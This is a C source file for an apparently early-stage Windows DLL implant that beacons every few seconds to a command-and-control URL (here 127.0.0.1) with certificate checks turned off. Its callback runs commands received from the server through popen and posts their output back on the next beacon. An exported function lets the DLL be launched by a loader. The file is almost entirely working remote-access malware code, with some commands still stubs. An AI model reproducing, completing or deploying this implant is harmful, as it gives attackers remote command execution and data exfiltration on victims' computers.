// cl.exe /LD /MD main.c /Fo.\obj\ /O2 /Ot /GL

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <Windows.h>

#define CURL_STATICLIB
#include "tinycurl\include\curl\curl.h"

// Library for MessageBox
#pragma comment(lib, "user32.lib")

// Libraries needed for tinycurl
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "normaliz.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "wldap32.lib")
#pragma comment(lib, "tinycurl\\lib\\libcurl_a.lib")

int main(void);
void jitter_connect(void);
void command_loop(void);
char *execute_command(const char *cmd);

__declspec(dllexport) void MainExport(void);

// This is for libcurl response data
struct MemoryStruct {
    char *response;
    size_t size;
};

char* STORED_RESPONSE = NULL;

// Callback function to handle libcurl response data, this is found mostly from libcurl man pages
// static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *clientp) {
//     size_t realsize = size * nmemb;
//     struct MemoryStruct *mem = (struct MemoryStruct *)clientp;

//     char *ptr = realloc(mem->response, mem->size + realsize + 1);
//     if(ptr == NULL)
//     {
//         fprintf(stderr, "Not enough memory (realloc returned NULL)\n");
//         return 0;
//     }

//     mem->response = ptr;
//     memcpy(&(mem->response[mem->size]), contents, realsize);
//     mem->size += realsize;
//     mem->response[mem->size] = 0;

//     return realsize;
// }

// Callback function to handle incoming data
size_t WriteMemoryCallback(void *ptr, size_t size, size_t nmemb, void *clientp)
{
    // Null-terminate the response just in case
    char* data = ptr;
    data[(size*nmemb)-1] = '\0';
    printf("Received data: %s\n", (char *)ptr);

    // TODO: Commands will become a linked list and looped through
    // For example, you can "load" a command and its functionality.
    char *valid_commands[] = {"load", "exec", "shell", "quit", "install"};
    
    // Find the first space character to separate command and arguments
    char *space_pos = strchr(data, ' ');

    // Replace space with null byte to separate command and arguments
    if (space_pos != NULL)
    {
        *space_pos = '\0';
    }
    // Calculate pointers for command and arguments
    char *command = data;
    char *arguments = space_pos + 1;

    if (strcmp(command, "shell") == 0)
    {
        MessageBox(NULL, "Received shell command", "Shell Command", MB_OK);
    }
    else if (strcmp(data, "quit") == 0)
    {
        exit(0);
    }
    else if (strcmp(data, "install") == 0)
    {
        FILE *fp = fopen("installed.txt", "w");
        if (fp != NULL) {
            fprintf(fp, "Installed\n");
            fclose(fp);
        } else {
            fprintf(stderr, "Failed to create file.\n");
        }
    } else if (strcmp(command, "exec") == 0) {
        STORED_RESPONSE = execute_command(arguments);
        printf("Command: %s\nResult: %s\n", arguments, STORED_RESPONSE);
    } else if (strcmp(command, "load") == 0) {
        printf("Received load command with arguments: %s\n", arguments);
        // Example: Call a function to handle load command with arguments
        // handle_load(arguments);
    }

    return size * nmemb;
}

int main(void)
{
    curl_global_init(CURL_GLOBAL_DEFAULT);
    jitter_connect();
    curl_global_cleanup();
}

void jitter_connect()
{
    // TODO: Make this jitter instead of a constant time.
    // Seperate initial connect from interactive connection
    while (1)
    {
        command_loop();
        // Sleep for 5 minutes (in milliseconds)
        // Sleep(5 * 60 * 1000);
        Sleep(5 * 1000);  
    }
}

void command_loop(void)
{
    CURL *curl;
    CURLcode res;
    
    // struct MemoryStruct chunk;
    // chunk.response = malloc(1);  // Buffer
    // chunk.size = 0;              // No data initially

    char* tmp = NULL;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, "https://127.0.0.1/key.pem");
        if (STORED_RESPONSE != NULL)
        {
            printf("sending response: %s\n", STORED_RESPONSE);
            tmp = strdup(STORED_RESPONSE);
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, tmp);
            free(STORED_RESPONSE);
            STORED_RESPONSE = NULL;
        }
        else
        {
            curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "none");
        }

        // Disable SSL certificate verification
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

        // Specify the callback function to handle the response data
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
        //curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

        // Perform the request
        res = curl_easy_perform(curl);
        if (res != CURLE_OK)
        {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        else
        {
            // Get the response code if needed
            long response_code;
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            printf("Response code: %ld\n", response_code);

            // Now chunk.memory points to a memory block containing the full response
            // if (chunk.size > 0)
            //     printf("Command results: %s\n", chunk.response);
        }

        // Cleanup
        if (tmp) {free(tmp);}
        curl_easy_cleanup(curl);
    }
}

// Execute a command and capture its output. Cross-compilable for both Unix and Windows
char *execute_command(const char *cmd) {
    #ifdef _WIN32
    #define popen _popen
    #define pclose _pclose
    #endif
    FILE *fp;
    char *result = NULL;
    char line[1024];
    size_t len = 0;
    size_t total_size = 0;

    // Open the command for reading
    fp = popen(cmd, "r");
    if (fp == NULL) {
        fprintf(stderr, "Failed to run command\n");
        return NULL;
    }

    // Read output line by line and dynamically allocate memory
    while (fgets(line, sizeof(line), fp) != NULL)
    {
        size_t line_length = strlen(line);
        result = realloc(result, total_size + line_length + 1);
        if (result == NULL) {
            fprintf(stderr, "Memory allocation failed\n");
            pclose(fp);
            return NULL;
        }
        strcpy(result + total_size, line);
        total_size += line_length;
    }

    // Clean up
    pclose(fp);

    return result;
}

__declspec(dllexport) void MainExport(void)
{
    main();
}
